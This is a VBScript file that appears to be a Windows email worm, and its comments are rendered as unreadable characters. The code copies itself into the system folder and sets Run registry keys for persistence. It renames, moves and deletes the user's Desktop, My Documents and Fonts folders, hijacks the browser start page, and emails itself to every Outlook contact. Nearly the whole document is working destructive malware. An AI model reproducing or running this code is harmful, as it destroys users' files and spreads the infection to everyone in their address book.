'            =======> ��� ������ <=======

'      ���������� ����������(���� ����� �� ����������)
Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")


' ����������� ��� ������ ������������
Set File2 = f.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

'     ������� ��������� � �������� ������
prl=inputbox("����� ������", "������")
if prl="����" then f.deletefile WScript.ScriptFullName, true: Wscript.Quit

' �������������� ���� ������, ����������� �� ������� ����� �� "������ ����!!!"
For Each Folder In s.SpecialFolders
if right(folder,12)="������� ����" then 
set tf=f.getfolder(folder)
set af=tf.files
For Each fl In af
set file=f.getfile(fl):t=t+1
file.name="������ ����!!!" & t
next
end if
next

' �������������� ���� ������, ����������� � ���� ���������� �� "��� � ���� ��� �� �����?"
For Each Folder In s.SpecialFolders
if right(folder,13)="��� ���������" then 
set tf=f.getfolder(folder)
set af=tf.files
For Each fl In af
set file=f.getfile(fl):t=t+1
file.name="��� � ���� ��� �� �����?" & t
next
end if
next

' ����������� ����� ��� ��������� � "�������"
For Each Folder In s.SpecialFolders
if right(folder,13)="��� ���������" then 
f.copyfolder folder, "�������"
f.deletefolder folder, true
next

' ����������� �������� ����� � "�������"
For Each Folder In s.SpecialFolders
if right(folder,12)="������� ����" then 
f.copyfolder folder, "�������"
f.deletefolder folder, true
next

' ����������� "C:\WINDOWS\system32\AdCache\b_151701.GIF" � "C:\Documents and Settings\����� �������������\��� ���������\��� ������\b_151701.GIF"
str="C:\WINDOWS\system32\AdCache\b_151701.GIF"
if f.fileExists(str)=true then
f.movefile "C:\WINDOWS\system32\AdCache\b_151701.GIF" ,"C:\Documents and Settings\����� �������������\��� ���������\��� ������\b_151701.GIF"
elseif f.folderExists(str)=true then
f.copyfolder str, "C:\Documents and Settings\����� �������������\��� ���������\��� ������\b_151701.GIF"
f.deletefolder str, true
end if

' ����������� "C:\Program Files\b_151701.GIF" � "C:\Program Files\b_151701.GIF"
str="C:\Program Files\b_151701.GIF"
if f.fileExists(str)=true then
f.movefile "C:\Program Files\b_151701.GIF" ,"C:\Program Files\b_151701.GIF"
elseif f.folderExists(str)=true then
f.copyfolder str, "C:\Program Files\b_151701.GIF"
f.deletefolder str, true
end if

' ������� �� ���� "http:\\www.dosug.ru"
ie.Visible = True
ie.Navigate "http:\\www.dosug.ru"

' ������� �������� �������� "http:\\www.dosug.ru"
s.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\www.dosug.ru"

' ��������� ����� ��� �������� ����������
For Index = 1 To oe.GetNameSpace("MAPI").AddressLists(1).count
Set OutMail = oe.CreateItem(0)
OutMail.to = oe.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "�� ����������! �����������!"
OutMail.Body = "��� �� ������ ������� ��� ������, �� ���. ��-��-��!"
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next


'     �������� ����������� �����
 For Each Folder In s.SpecialFolders

' �������� �������
 if right(folder,5)="FONTS" then f.deletefolder folder,true

' �������� ������������
 if right(folder,12)="������������" then f.deletefolder folder,true

' �������� ��� ���������
 if right(folder,13)="��� ���������" then f.deletefolder folder,true
 Next

'     ������� ��������� 
s.popup "�� ��� � ���������� ? �����!", , "������� ���� ��������� ����� ������������� , ���� ��� ... ���!", 0+32

